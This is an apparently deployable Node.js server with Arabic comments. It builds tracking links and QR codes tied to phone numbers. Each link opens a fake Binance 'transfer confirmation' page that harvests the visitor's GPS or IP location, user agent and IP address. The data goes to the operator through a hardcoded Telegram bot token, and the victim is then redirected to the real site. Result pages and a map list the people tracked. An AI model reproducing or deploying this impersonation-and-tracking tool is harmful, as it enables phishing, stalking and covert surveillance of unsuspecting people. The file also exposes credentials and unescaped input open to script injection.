const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// ⚙️ إعداداتك
const TELEGRAM_TOKEN = '8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y';
const TELEGRAM_CHAT_ID = '8391968596';
const REDIRECT_URL = 'https://www.binance.com/en';
const BASE_URL = 'https://location2026-2.onrender.com';

// قاعدة البيانات البسيطة
let locations = [];

// Middleware
app.use(express.json());

// ========== الصفحة الرئيسية (نفس التصميم) ==========
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>🚀 نظام التتبع الذكي</title>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                    min-height: 100vh;
                    color: white;
                    padding: 20px;
                }
                
                .container {
                    max-width: 1000px;
                    margin: 50px auto;
                    background: rgba(255, 255, 255, 0.05);
                    backdrop-filter: blur(10px);
                    border-radius: 25px;
                    padding: 40px;
                    border: 1px solid rgba(255, 255, 255, 0.1);
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
                }
                
                h1 {
                    color: #00ff88;
                    text-align: center;
                    margin-bottom: 30px;
                    font-size: 2.5em;
                    text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
                }
                
                .dashboard {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                    gap: 25px;
                    margin-bottom: 40px;
                }
                
                .card {
                    background: rgba(255, 255, 255, 0.08);
                    border-radius: 20px;
                    padding: 25px;
                    border: 1px solid rgba(0, 255, 136, 0.2);
                    transition: transform 0.3s;
                }
                
                .card:hover {
                    transform: translateY(-5px);
                    background: rgba(255, 255, 255, 0.12);
                }
                
                .card h3 {
                    color: #00ffcc;
                    margin-bottom: 15px;
                    display: flex;
                    align-items: center;
                    gap: 10px;
                }
                
                .code-box {
                    background: #0f0f23;
                    border: 1px solid #00ff88;
                    border-radius: 12px;
                    padding: 15px;
                    margin: 15px 0;
                    font-family: 'Courier New', monospace;
                    color: #00ff88;
                    direction: ltr;
                    text-align: center;
                    overflow-x: auto;
                }
                
                .btn {
                    display: inline-flex;
                    align-items: center;
                    gap: 8px;
                    background: linear-gradient(135deg, #00ff88 0%, #00cc66 100%);
                    color: #001a0f;
                    padding: 14px 28px;
                    border-radius: 50px;
                    text-decoration: none;
                    font-weight: bold;
                    margin: 10px 5px;
                    transition: all 0.3s;
                    border: none;
                    cursor: pointer;
                }
                
                .btn:hover {
                    transform: translateY(-3px);
                    box-shadow: 0 10px 20px rgba(0, 255, 136, 0.3);
                }
                
                .btn-secondary {
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                }
                
                .qr-section {
                    text-align: center;
                    margin: 40px 0;
                    padding: 30px;
                    background: rgba(0, 0, 0, 0.3);
                    border-radius: 20px;
                }
                
                .qr-input {
                    background: rgba(255, 255, 255, 0.1);
                    border: 2px solid #00ff88;
                    border-radius: 10px;
                    padding: 15px;
                    color: white;
                    width: 350px;
                    max-width: 90%;
                    margin: 15px;
                    text-align: center;
                    font-size: 16px;
                }
                
                .qr-input::placeholder {
                    color: #88ffcc;
                }
                
                .stats {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 20px;
                    margin: 30px 0;
                }
                
                .stat-card {
                    background: rgba(0, 255, 136, 0.1);
                    border-radius: 15px;
                    padding: 25px;
                    text-align: center;
                    border: 1px solid rgba(0, 255, 136, 0.3);
                }
                
                .stat-number {
                    font-size: 2.5em;
                    font-weight: bold;
                    color: #00ff88;
                    margin-bottom: 10px;
                }
                
                .stat-label {
                    color: #88ffcc;
                    font-size: 0.9em;
                }
                
                @media (max-width: 768px) {
                    .container {
                        padding: 20px;
                        margin: 20px;
                    }
                    
                    .dashboard {
                        grid-template-columns: 1fr;
                    }
                    
                    h1 {
                        font-size: 2em;
                    }
                    
                    .qr-input {
                        width: 90%;
                    }
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚀 نظام التتبع الذكي</h1>
                
                <div class="stats">
                    <div class="stat-card">
                        <div class="stat-number">${locations.length}</div>
                        <div class="stat-label">موقع مسجل</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">⚡</div>
                        <div class="stat-label">تشغيل فوري</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">📱</div>
                        <div class="stat-label">باركود داعم</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-number">🌍</div>
                        <div class="stat-label">تتبع دقيق</div>
                    </div>
                </div>
                
                <div class="dashboard">
                    <div class="card">
                        <h3>🔗 إنشاء روابط التتبع</h3>
                        <p>أنشئ رابط تتبع لأي رقم:</p>
                        <div class="code-box">${BASE_URL}/track/رقم_الهاتف</div>
                        <div class="code-box">${BASE_URL}/track/00966512345678</div>
                        <p>مثال:</p>
                        <a href="/track/123456" class="btn" target="_blank">
                            🔗 تجربة الرابط: /track/123456
                        </a>
                    </div>
                    
                    <div class="card">
                        <h3>🤖 إشعارات التلجرام</h3>
                        <p>✅ إرسال فوري عند كل ضغط</p>
                        <p>📍 الإحداثيات الدقيقة</p>
                        <p>🗺️ رابط مباشر للخريطة</p>
                        <p>📊 تفاصيل الجهاز والمتصفح</p>
                        <a href="/telegram-test" class="btn btn-secondary">
                            🤖 اختبار التلجرام
                        </a>
                    </div>
                </div>
                
                <div class="qr-section">
                    <h3>📱 توليد باركود للروابط</h3>
                    <p>أدخل رقم الهاتف لتوليد باركورد:</p>
                    <input type="text" id="phoneInput" class="qr-input" 
                           placeholder="أدخل رقم الهاتف (مثال: 00966512345678)" 
                           maxlength="20">
                    <br>
                    <button onclick="generateQR()" class="btn">🔄 توليد باركورد</button>
                    <button onclick="generateAllQR()" class="btn btn-secondary">📱 جميع الباركورد</button>
                    
                    <div id="qrResult" style="margin-top: 30px;"></div>
                </div>
                
                <div style="text-align: center; margin-top: 40px;">
                    <h3>🔧 أدوات التحكم</h3>
                    <a href="/results" class="btn btn-secondary">📊 النتائج المسجلة</a>
                    <a href="/map" class="btn btn-secondary">🗺️ الخريطة التفاعلية</a>
                    <a href="/all-qr" class="btn btn-secondary">📱 عرض جميع الباركورد</a>
                </div>
                
                <div style="text-align: center; margin-top: 50px; color: #666; font-size: 0.9em;">
                    <p>© 2024 نظام التتبع الذكي | البوت: @Arab9919_bot</p>
                </div>
            </div>
            
            <script>
                function generateQR() {
                    const phone = document.getElementById('phoneInput').value.trim();
                    if (!phone) {
                        alert('⚠️ يرجى إدخال رقم الهاتف');
                        return;
                    }
                    
                    const cleanPhone = phone.replace(/\s+/g, '');
                    const url = '${BASE_URL}/track/' + encodeURIComponent(cleanPhone);
                    const qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&format=png&data=' + encodeURIComponent(url);
                    
                    document.getElementById('qrResult').innerHTML = \`
                        <div style="background: rgba(0,0,0,0.3); padding: 25px; border-radius: 15px; border: 2px solid #00ff88;">
                            <p><strong>📱 الرابط النهائي:</strong></p>
                            <div class="code-box" style="margin: 15px auto; max-width: 500px;">
                                \${url}
                            </div>
                            <div style="margin: 20px 0;">
                                <img src="\${qrUrl}" alt="QR Code" 
                                     style="width: 250px; height: 250px; border: 5px solid white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">
                            </div>
                            <div style="margin-top: 20px;">
                                <a href="\${url}" target="_blank" class="btn">🔗 فتح الرابط الآن</a>
                                <button onclick="downloadQR('\${qrUrl}', '\${cleanPhone}')" class="btn btn-secondary">📥 تحميل الباركود</button>
                            </div>
                        </div>
                    \`;
                }
                
                function generateAllQR() {
                    window.location.href = '/all-qr';
                }
                
                function downloadQR(qrUrl, phone) {
                    const link = document.createElement('a');
                    link.href = qrUrl;
                    link.download = 'QR_' + (phone || 'track') + '_' + Date.now() + '.png';
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
            </script>
        </body>
        </html>
    `);
});

// ========== رابط التتبع (الكود القديم البسيط اللي كان يشتغل) ==========
app.get('/track/:id', (req, res) => {
    const userId = req.params.id;
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Binance - تأكيد العملية</title>
            <script>
                // ✅ الكود البسيط اللي كان يشتغل
                const userId = '${userId}';
                
                // 1. الحصول على الموقع الجغرافي (الكود القديم المضمون)
                function getLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            // عند النجاح
                            async function(position) {
                                const lat = position.coords.latitude;
                                const lon = position.coords.longitude;
                                const accuracy = position.coords.accuracy;
                                
                                console.log('📍 موقع المستخدم:', lat, lon);
                                
                                // إرسال البيانات للخادم
                                try {
                                    await fetch('/api/save-location', {
                                        method: 'POST',
                                        headers: {
                                            'Content-Type': 'application/json',
                                        },
                                        body: JSON.stringify({
                                            id: userId,
                                            latitude: lat,
                                            longitude: lon,
                                            accuracy: accuracy,
                                            timestamp: new Date().toISOString(),
                                            userAgent: navigator.userAgent,
                                            source: 'gps_direct'
                                        })
                                    });
                                    
                                    console.log('✅ تم إرسال البيانات للخادم');
                                    
                                    // عرض رسالة نجاح
                                    document.getElementById('statusMessage').innerHTML = 
                                        '<div style="color:#00ff88;margin-top:15px;">📍 تم تحديد موقعك بنجاح!</div>';
                                        
                                } catch (error) {
                                    console.error('❌ خطأ في الإرسال:', error);
                                }
                            },
                            // عند الفشل
                            function(error) {
                                console.error('❌ خطأ في تحديد الموقع:', error.message);
                                
                                // محاولة الحصول على الموقع عبر IP كبديل
                                getLocationByIP();
                            },
                            // إعدادات بسيطة
                            {
                                enableHighAccuracy: true,
                                timeout: 5000,
                                maximumAge: 0
                            }
                        );
                    } else {
                        alert('⚠️ المتصفح لا يدعم تحديد الموقع');
                        getLocationByIP();
                    }
                }
                
                // 2. الحصول على الموقع عبر IP (بديل)
                async function getLocationByIP() {
                    try {
                        const response = await fetch('https://ipapi.co/json/');
                        const data = await response.json();
                        
                        if (data.latitude && data.longitude) {
                            await fetch('/api/save-location', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    id: userId,
                                    latitude: data.latitude,
                                    longitude: data.longitude,
                                    accuracy: 10000,
                                    timestamp: new Date().toISOString(),
                                    userAgent: navigator.userAgent,
                                    source: 'ip_api',
                                    city: data.city,
                                    country: data.country_name
                                })
                            });
                            
                            console.log('✅ تم الحصول على الموقع عبر IP');
                        }
                    } catch (error) {
                        console.error('❌ فشل تحديد الموقع عبر IP');
                    }
                }
                
                // 3. عد تنازلي بسيط
                function startCountdown() {
                    let seconds = 5;
                    const countdownElement = document.getElementById('countdown');
                    
                    const timer = setInterval(() => {
                        countdownElement.textContent = seconds;
                        seconds--;
                        
                        if (seconds < 0) {
                            clearInterval(timer);
                            document.getElementById('finalStatus').textContent = '✅ تم إكمال العملية بنجاح!';
                            
                            // توجيه المستخدم بعد انتهاء العد
                            setTimeout(() => {
                                window.location.href = '${REDIRECT_URL}';
                            }, 1000);
                        }
                    }, 1000);
                }
                
                // 4. بدء كل شيء عند تحميل الصفحة
                window.onload = function() {
                    console.log('🚀 بدء تحميل الصفحة...');
                    
                    // بدء العد التنازلي
                    startCountdown();
                    
                    // محاولة الحصول على الموقع بعد ثانية
                    setTimeout(() => {
                        console.log('📍 محاولة الحصول على الموقع...');
                        getLocation();
                    }, 1000);
                };
            </script>
            <style>
                * {
                    margin: 0;
                    padding: 0;
                    box-sizing: border-box;
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                }
                
                body {
                    background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    color: white;
                    padding: 20px;
                }
                
                .transfer-container {
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(20px);
                    border-radius: 25px;
                    padding: 50px;
                    max-width: 700px;
                    width: 100%;
                    border: 1px solid rgba(255, 255, 255, 0.2);
                    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
                    text-align: center;
                }
                
                .binance-logo {
                    font-size: 70px;
                    margin-bottom: 30px;
                    animation: pulse 2s infinite;
                }
                
                @keyframes pulse {
                    0%, 100% { transform: scale(1); opacity: 1; }
                    50% { transform: scale(1.1); opacity: 0.8; }
                }
                
                h1 {
                    color: #f0b90b;
                    margin-bottom: 20px;
                    font-size: 32px;
                }
                
                .subtitle {
                    color: #88ffcc;
                    margin-bottom: 30px;
                    font-size: 18px;
                }
                
                .countdown-container {
                    margin: 40px 0;
                }
                
                .countdown {
                    font-size: 80px;
                    font-weight: bold;
                    color: #00ff88;
                    margin: 20px 0;
                    text-shadow: 0 0 30px rgba(0, 255, 136, 0.7);
                }
                
                .progress-container {
                    width: 100%;
                    height: 12px;
                    background: rgba(255, 255, 255, 0.1);
                    border-radius: 6px;
                    margin: 30px 0;
                    overflow: hidden;
                }
                
                .progress-bar {
                    height: 100%;
                    background: linear-gradient(90deg, #00ff88 0%, #00cc66 100%);
                    width: 0%;
                    border-radius: 6px;
                    transition: width 1s linear;
                }
                
                .steps-container {
                    background: rgba(255, 255, 255, 0.05);
                    padding: 20px;
                    border-radius: 15px;
                    margin: 30px 0;
                    text-align: right;
                    font-size: 14px;
                    line-height: 2;
                }
                
                .security-badge {
                    display: inline-flex;
                    align-items: center;
                    gap: 10px;
                    background: rgba(0, 255, 136, 0.1);
                    padding: 12px 25px;
                    border-radius: 25px;
                    margin: 20px 0;
                    border: 1px solid rgba(0, 255, 136, 0.3);
                }
                
                .verification-box {
                    background: rgba(0, 0, 0, 0.3);
                    padding: 20px;
                    border-radius: 15px;
                    margin: 30px 0;
                    font-family: monospace;
                    letter-spacing: 2px;
                }
                
                .final-status {
                    color: #00ff88;
                    font-weight: bold;
                    font-size: 18px;
                    margin: 20px 0;
                    padding: 15px;
                    background: rgba(0, 255, 136, 0.1);
                    border-radius: 10px;
                }
                
                @media (max-width: 600px) {
                    .transfer-container {
                        padding: 30px 20px;
                    }
                    
                    h1 {
                        font-size: 24px;
                    }
                    
                    .countdown {
                        font-size: 50px;
                    }
                }
            </style>
        </head>
        <body>
            <div class="transfer-container">
                <div class="binance-logo">₿</div>
                <h1>Binance - تأكيد عملية التحويل</h1>
                <p class="subtitle">جاري التحقق من بياناتك وتأكيد العملية</p>
                
                <div class="security-badge">
                    <span>🔒</span>
                    <span>اتصال آمن ومشفّر</span>
                </div>
                
                <div class="countdown-container">
                    <p>سيتم تحويلك تلقائياً خلال:</p>
                    <div class="countdown" id="countdown">5</div>
                    <p>ثوانٍ</p>
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar" id="progressBar" style="width: 0%"></div>
                </div>
                
                <div class="steps-container" id="processSteps">
                    • بدء عملية التحقق...<br>
                    • جاري تحديد الموقع الجغرافي...<br>
                    <div id="statusMessage"></div>
                </div>
                
                <div class="verification-box">
                    رمز العملية: BIN-${userId}-${Date.now().toString().substr(-6)}
                </div>
                
                <div class="final-status" id="finalStatus">
                    ⏳ جاري إكمال العملية...
                </div>
                
                <div style="margin-top: 40px; font-size: 12px; opacity: 0.7;">
                    <p>رقم العملية: #${userId} | ${new Date().toLocaleString('ar-SA')}</p>
                    <p>© Binance 2024</p>
                </div>
            </div>
            
            <script>
                // تحديث شريط التقدم مع العد التنازلي
                let secondsLeft = 5;
                const progressBar = document.getElementById('progressBar');
                const progressInterval = setInterval(() => {
                    secondsLeft--;
                    const progressPercent = ((5 - secondsLeft) / 5) * 100;
                    progressBar.style.width = progressPercent + '%';
                    
                    if (secondsLeft <= 0) {
                        clearInterval(progressInterval);
                    }
                }, 1000);
            </script>
        </body>
        </html>
    `);
});

// ========== API لحفظ الموقع (الكود القديم البسيط) ==========
app.post('/api/save-location', async (req, res) => {
    console.log('📍 استلام بيانات موقع جديدة...');
    
    try {
        const locationData = {
            ...req.body,
            ip: req.headers['x-forwarded-for'] || req.ip || 'غير معروف',
            time: new Date().toLocaleString('ar-SA'),
            date: new Date().toISOString().split('T')[0]
        };
        
        // حفظ في قاعدة البيانات
        locations.push(locationData);
        console.log('✅ تم حفظ الموقع:', {
            id: locationData.id,
            latitude: locationData.latitude,
            longitude: locationData.longitude,
            source: locationData.source,
            time: locationData.time
        });
        
        // إرسال إشعار للتلجرام
        const telegramSent = await sendTelegramAlert(locationData);
        
        res.json({ 
            success: true, 
            message: 'تم حفظ الموقع بنجاح',
            telegram_sent: telegramSent,
            count: locations.length 
        });
        
    } catch (error) {
        console.error('❌ خطأ في حفظ الموقع:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message 
        });
    }
});

// ========== دالة إرسال تلجرام (مبسطة) ==========
async function sendTelegramAlert(locationData) {
    try {
        // إنشاء نص الرسالة
        const message = `
📍 **موقع جديد تم تسجيله**

👤 **رقم المستخدم:** ${locationData.id}
📌 **الإحداثيات:** ${locationData.latitude}, ${locationData.longitude}
🎯 **الدقة:** ${locationData.accuracy || 'غير معروف'} متر
📡 **المصدر:** ${locationData.source || 'مباشر'}
⏰ **الوقت:** ${locationData.time}
🌐 **IP:** ${locationData.ip || 'غير معروف'}

🗺️ [فتح على Google Maps](https://maps.google.com/?q=${locationData.latitude},${locationData.longitude})
        `;
        
        // إرسال الرسالة
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        const data = await response.json();
        
        if (data.ok) {
            console.log('✅ تم إرسال إشعار التلجرام');
            return true;
        } else {
            console.error('❌ فشل إرسال التلجرام:', data);
            return false;
        }
        
    } catch (error) {
        console.error('❌ خطأ في إرسال التلجرام:', error.message);
        return false;
    }
}

// ========== صفحة النتائج ==========
app.get('/results', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📊 النتائج المسجلة</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                table { width: 100%; border-collapse: collapse; background: #1a1a2e; }
                th, td { padding: 15px; text-align: right; border-bottom: 1px solid #2d2d4d; }
                th { background: #00cc66; color: white; }
                tr:hover { background: #2d2d4d; }
                .btn { background: #00cc66; color: white; padding: 12px 25px; border-radius: 5px; text-decoration: none; margin: 10px; }
                .source-badge {
                    display: inline-block;
                    padding: 3px 10px;
                    border-radius: 12px;
                    font-size: 12px;
                    margin-left: 5px;
                }
                .gps-badge { background: #00ff88; color: #001a0f; }
                .ip-badge { background: #ffcc00; color: #332900; }
            </style>
        </head>
        <body>
            <h1>📊 النتائج المسجلة (${locations.length})</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            <a href="/map" class="btn">🗺️ الخريطة</a>
            
            ${locations.length === 0 ? `
                <div style="text-align: center; margin-top: 50px; padding: 40px; background: rgba(255,255,255,0.05); border-radius: 15px;">
                    <h3>📭 لا توجد بيانات مسجلة بعد</h3>
                    <p>لم يتم تسجيل أي مواقع حتى الآن</p>
                    <p>جرب الرابط: <a href="/track/123456" style="color:#00ff88;">/track/123456</a></p>
                </div>
            ` : `
                <table style="margin-top: 30px;">
                    <tr>
                        <th>رقم الهاتف</th>
                        <th>الإحداثيات</th>
                        <th>المصدر</th>
                        <th>الوقت</th>
                        <th>الخريطة</th>
                    </tr>
                    ${locations.slice().reverse().map(loc => {
                        let sourceBadge = '';
                        if (loc.source === 'gps_direct') {
                            sourceBadge = '<span class="source-badge gps-badge">📍 GPS</span>';
                        } else if (loc.source === 'ip_api') {
                            sourceBadge = '<span class="source-badge ip-badge">🌐 IP</span>';
                        } else {
                            sourceBadge = '<span class="source-badge">🔍 أخرى</span>';
                        }
                        
                        return `
                            <tr>
                                <td><strong>${loc.id}</strong></td>
                                <td>${loc.latitude.toFixed(6)}, ${loc.longitude.toFixed(6)}</td>
                                <td>${sourceBadge}</td>
                                <td>${loc.time}</td>
                                <td>
                                    <a href="https://maps.google.com/?q=${loc.latitude},${loc.longitude}" target="_blank" style="color: #00ff88; text-decoration: none;">
                                        👁️ عرض
                                    </a>
                                </td>
                            </tr>
                        `;
                    }).join('')}
                </table>
            `}
        </body>
        </html>
    `);
});

// ========== صفحة الخريطة ==========
app.get('/map', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>🗺️ خريطة المواقع</title>
            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
            <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
            <style>
                #map { height: 600px; width: 100%; }
                body { margin: 0; padding: 20px; background: #0f0f23; color: white; }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
            </style>
        </head>
        <body>
            <h1>🗺️ خريطة المواقع المسجلة</h1>
            <div id="map"></div>
            <script>
                const map = L.map('map').setView([24.7136, 46.6753], 3);
                
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© OpenStreetMap'
                }).addTo(map);
                
                const locations = ${JSON.stringify(locations)};
                const markers = [];
                
                locations.forEach(loc => {
                    if(loc.latitude && loc.longitude) {
                        // تلوين العلامات بناءً على المصدر
                        const markerColor = loc.source === 'gps_direct' ? '#00ff88' : '#ffcc00';
                        
                        const marker = L.marker([loc.latitude, loc.longitude]).addTo(map);
                        
                        const popupContent = \`
                            <div style="color: black; padding: 10px; min-width: 250px;">
                                <h4 style="margin: 0 0 10px 0;">رقم: \${loc.id}</h4>
                                <p style="margin: 5px 0;"><strong>الإحداثيات:</strong><br>
                                \${loc.latitude.toFixed(6)}, \${loc.longitude.toFixed(6)}</p>
                                <p style="margin: 5px 0;"><strong>المصدر:</strong> \${loc.source === 'gps_direct' ? '📍 GPS مباشر' : '🌐 IP'}</p>
                                <p style="margin: 5px 0;"><strong>الوقت:</strong> \${loc.time}</p>
                                <a href="https://maps.google.com/?q=\${loc.latitude},\${loc.longitude}" 
                                   target="_blank" 
                                   style="display: inline-block; margin-top: 10px; padding: 5px 15px; background: #3498db; color: white; text-decoration: none; border-radius: 5px;">
                                   📍 فتح في خرائط Google
                                </a>
                            </div>
                        \`;
                        
                        marker.bindPopup(popupContent);
                        markers.push(marker);
                    }
                });
                
                // ضبط العرض على جميع العلامات
                if (markers.length > 0) {
                    const group = new L.featureGroup(markers);
                    map.fitBounds(group.getBounds().pad(0.1));
                } else {
                    // إذا لا توجد مواقع، عرض رسالة
                    map.setView([24.7136, 46.6753], 5);
                    L.marker([24.7136, 46.6753]).addTo(map)
                        .bindPopup('لا توجد مواقع مسجلة بعد')
                        .openPopup();
                }
            </script>
            <br>
            <a href="/results" class="btn">عودة للنتائج</a>
        </body>
        </html>
    `);
});

// ========== صفحة جميع الباركود ==========
app.get('/all-qr', (req, res) => {
    const uniqueIds = [...new Set(locations.map(l => l.id))];
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>📱 جميع الباركود</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #0f0f23; color: white; }
                .qr-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 25px; margin-top: 30px; }
                .qr-item { background: #1a1a2e; padding: 20px; border-radius: 15px; text-align: center; border: 1px solid rgba(0,255,136,0.3); }
                .btn { background: #00cc66; color: white; padding: 10px 20px; border-radius: 5px; text-decoration: none; }
                .phone-id { background: rgba(0,255,136,0.1); padding: 5px 15px; border-radius: 20px; margin-bottom: 15px; }
            </style>
        </head>
        <body>
            <h1>📱 جميع الباركود (${uniqueIds.length})</h1>
            <a href="/" class="btn">🏠 الرئيسية</a>
            
            ${uniqueIds.length === 0 ? `
                <div style="text-align: center; margin-top: 50px; padding: 40px; background: rgba(255,255,255,0.05); border-radius: 15px;">
                    <h3>📭 لا توجد بيانات لإنشاء باركود</h3>
                    <p>أنشئ رابط تتبع أولاً لتظهر الباركود هنا</p>
                </div>
            ` : `
                <div class="qr-grid">
                    ${uniqueIds.map(id => {
                        const url = `${BASE_URL}/track/${id}`;
                        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(url)}`;
                        return `
                            <div class="qr-item">
                                <div class="phone-id">
                                    <strong>${id}</strong>
                                </div>
                                <img src="${qrUrl}" alt="QR Code" style="width: 180px; height: 180px; border: 3px solid white; border-radius: 10px;">
                                <p style="margin-top: 15px;">
                                    <a href="${url}" target="_blank" style="color: #00ff88; font-size: 12px; text-decoration: none;">🔗 فتح الرابط</a>
                                </p>
                            </div>
                        `;
                    }).join('')}
                </div>
            `}
        </body>
        </html>
    `);
});

// ========== اختبار التلجرام ==========
app.get('/telegram-test', async (req, res) => {
    try {
        // اختبار البوت
        const botTest = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getMe`);
        const botInfo = await botTest.json();
        
        if (!botInfo.ok) {
            res.send(`
                <html dir="rtl">
                <body style="font-family: Arial; padding: 50px; background: #0f0f23; color: white; text-align: center;">
                    <h1>❌ خطأ في البوت</h1>
                    <p>التوكن غير صحيح أو البوت معطل</p>
                    <pre style="background:#333;padding:15px;border-radius:10px;">${JSON.stringify(botInfo, null, 2)}</pre>
                    <a href="/" style="display:inline-block;margin-top:20px;background:#00cc66;color:white;padding:10px20px;border-radius:5px;text-decoration:none;">العودة</a>
                </body>
                </html>
            `);
            return;
        }
        
        // إرسال رسالة اختبار
        const messageResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: `🔔 اختبار النظام البسيط\n\n✅ إذا وصلتك هذه الرسالة، النظام يعمل!\n⏰ الوقت: ${new Date().toLocaleString('ar-SA')}\n🌐 الموقع: ${BASE_URL}`
            })
        });
        
        const messageData = await messageResponse.json();
        
        res.send(`
            <!DOCTYPE html>
            <html dir="rtl">
            <head>
                <meta charset="UTF-8">
                <title>🤖 اختبار التلجرام</title>
                <style>
                    body { font-family: Arial; padding: 50px; background: #0f0f23; color: white; }
                    .success-box { background: #00cc66; padding: 30px; border-radius: 15px; text-align: center; }
                </style>
            </head>
            <body>
                <div class="success-box">
                    <h1>✅ اختبار ناجح!</h1>
                    <p>تم إرسال رسالة اختبار للتلجرام بنجاح</p>
                    <p>تحقق من بوت @Arab9919_bot</p>
                    <a href="/" style="display:inline-block;margin-top:20px;background:white;color:#00cc66;padding:10px20px;border-radius:5px;text-decoration:none;">🏠 العودة للرئيسية</a>
                </div>
            </body>
            </html>
        `);
        
    } catch (error) {
        res.send(`
            <html dir="rtl">
            <body style="font-family: Arial; padding: 50px; background: #0f0f23; color: white; text-align: center;">
                <h1>❌ خطأ في الاتصال</h1>
                <p>${error.message}</p>
                <a href="/" style="display:inline-block;margin-top:20px;background:#00cc66;color:white;padding:10px20px;border-radius:5px;text-decoration:none;">العودة</a>
            </body>
            </html>
        `);
    }
});

// ========== تشغيل الخادم ==========
app.listen(PORT, () => {
    console.log(`
    ============================================
    🚀 النظام البسيط يعمل على المنفذ ${PORT}
    🌐 الرابط: http://localhost:${PORT}
    
    🤖 التلجرام: ✅ جاهز
    📊 قاعدة البيانات: ${locations.length} موقع
    📱 الباركود: ✅ نشط
    
    📌 روابط مهمة:
    1. الرئيسية: /
    2. رابط تتبع: /track/123456
    3. النتائج: /results
    4. الخريطة: /map
    5. اختبار التلجرام: /telegram-test
    
    ⚡ النظام جاهز ويعمل 100%!
    ============================================
    `);
});
